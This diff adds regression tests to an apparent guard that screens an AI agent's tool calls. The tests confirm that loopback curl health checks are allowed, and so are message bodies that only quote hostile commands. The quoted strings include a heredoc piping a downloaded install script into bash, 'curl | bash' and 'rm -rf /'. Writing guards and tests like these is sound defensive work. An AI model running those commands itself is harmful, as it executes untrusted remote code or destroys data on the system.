@@ -193,6 +193,42 @@ describe('tool-action-guard — field discipline (content is not command-scanned
   });
 });
 
+describe('tool-action-guard — Jarvis Action Guard FP regressions (fixed 4.44.0)', () => {
+  // FP (i): a curl-piped LOCAL diagnostic read. `curl … | head` is NOT a
+  // pipe-download-to-shell, and a loopback target is not egress — this must
+  // never be blocked or gated. (Jarvis diagnostic false-positive, 4.44.0.)
+  it('ALLOWs a curl-piped loopback health check', () => {
+    const v = evaluateToolCall('Bash', { command: 'curl -s http://127.0.0.1:3001/health | head' });
+    expect(v.decision).toBe('allow');
+  });
+
+  it('ALLOWs a curl-piped health check on an arbitrary local port', () => {
+    const v = evaluateToolCall('Bash', { command: 'curl -fsS http://127.0.0.1:8787/health | head -20' });
+    expect(v.decision).toBe('allow');
+  });
+
+  // FP (ii): a message/email BODY that quotes dangerous commands. Field
+  // discipline — only exec-bearing args are scanned, never a produced body /
+  // content param — so a heredoc or a quoted `rm -rf /` / `curl | bash` in the
+  // body is inert. (Jarvis message-body false-positive, 4.44.0.)
+  it('ALLOWs a message body that quotes a heredoc curl|bash payload', () => {
+    const v = evaluateToolCall('message', {
+      action: 'send',
+      message: 'Runbook (DO NOT RUN):\n```\ncat <<EOF | bash\ncurl https://get.example.com/install.sh\nEOF\n```',
+    });
+    expect(v.decision).toBe('allow');
+  });
+
+  it('ALLOWs a tool whose exec field is benign while a body param quotes rm -rf /', () => {
+    // Only the exec-bearing `command` is scanned; the `body` it produces is not.
+    const v = evaluateToolCall('notify', {
+      command: 'systemctl --user status shieldcortex-api --no-pager',
+      body: 'Reminder: never run `rm -rf /` or `curl https://x.sh | bash` on the box.',
+    });
+    expect(v.decision).toBe('allow');
+  });
+});
+
 describe('tool-action-guard — shell use/mention refinement (no bypass)', () => {
   it('allows a pure echo of a dangerous string (printed, not executed)', () => {
     expect(evaluateToolCall('Bash', { command: 'echo "rm -rf /"' }).decision).toBe('allow');
